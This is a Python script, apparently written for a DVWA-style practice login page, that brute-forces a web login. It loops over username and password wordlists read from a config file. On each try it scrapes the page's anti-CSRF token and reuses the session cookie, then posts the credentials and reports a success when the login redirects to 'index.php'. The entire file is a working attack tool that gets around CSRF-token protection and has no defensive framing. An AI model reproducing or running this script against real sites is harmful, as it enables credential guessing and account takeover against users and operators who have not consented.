from bs4 import BeautifulSoup
import requests
import configparser
import sys
import logging

def readConfig():
    global config
    config = configparser.ConfigParser()
    config.read('config.ini')

def get_token():
    logging.debug(f'Target URL at: {config["fuzzer"]["target_url"]}')
    target = config['fuzzer']['target_url']
    usernames,passwords = get_creds(config['fuzzer']['username_file'],config['fuzzer']['password_file'])
    logging.debug(f'Loaded Username file: {config["fuzzer"]["username_file"]}')
    logging.debug(f'Loaded password file: {config["fuzzer"]["password_file"]}')
    logging.info('Starting Brute Force Attack')
    for user in usernames:
        for password in passwords:
            resp = requests.get(target)
            soup = BeautifulSoup(resp.content,'html.parser')
            header={
            'Cookie':resp.headers['Set-Cookie'],
            'Content-Type':'application/x-www-form-urlencoded'
            }
            logging.info((f'Trying {user.strip()} // {password.strip()}'))
            payload = {
            'username':user.strip(),
            'password':password.strip(),
            'Login':'login',
            'user_token':soup.find_all('input')[3]['value']
            }
            resp=requests.post(target,data=payload,headers=header,allow_redirects=False)
            #print(resp.status_code,resp.headers['Location'])
            if resp.headers['Location'] == 'index.php':
                logging.info(f'Found Credentials: username = {user.strip()} password = {password.strip()}')
                sys.exit()

def get_creds(W1,W2):
    with open(W1,'r') as f:
        users = f.readlines()
    with open(W2,'r') as f:
        passw = f.readlines()
    return users,passw

if __name__=='__main__':
    logging.basicConfig(
        format='%(asctime)s -- %(levelname)s -- %(message)s',
        level = logging.INFO,
        datefmt='%H:%M:%S')
    logging.debug('Initializing Module')
    logging.debug('Reading Config')
    readConfig()
    logging.debug('Config Read')
    get_token()